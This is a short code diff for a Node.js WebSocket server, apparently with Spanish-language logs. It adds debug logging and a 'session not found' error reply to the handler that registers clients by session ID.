@@ -1577,14 +1577,22 @@ _Fecha: ${new Date().toLocaleString('es-MX')}_
           } 
           else if (data.role === 'CLIENT' && data.sessionId) {
             clients.set(data.sessionId, ws);
-            console.log(`Client registered with session ID: ${data.sessionId}`);
+            console.log(`[WebSocket] Client registered with session ID: ${data.sessionId}`);
 
             // Get session info and send to client
+            console.log(`[WebSocket] Buscando sesión con ID: ${data.sessionId}`);
             const session = await storage.getSessionById(data.sessionId);
             if (session) {
+              console.log(`[WebSocket] Sesión encontrada: ${session.sessionId}, banco: ${session.banco}, pasoActual: ${session.pasoActual}`);
               ws.send(JSON.stringify({
                 type: 'INIT_SESSION',
                 data: session
+              }));
+            } else {
+              console.log(`[WebSocket] ERROR: No se encontró sesión con ID: ${data.sessionId}`);
+              ws.send(JSON.stringify({
+                type: 'ERROR',
+                message: 'Sesión no encontrada'
               }));
             }
           }
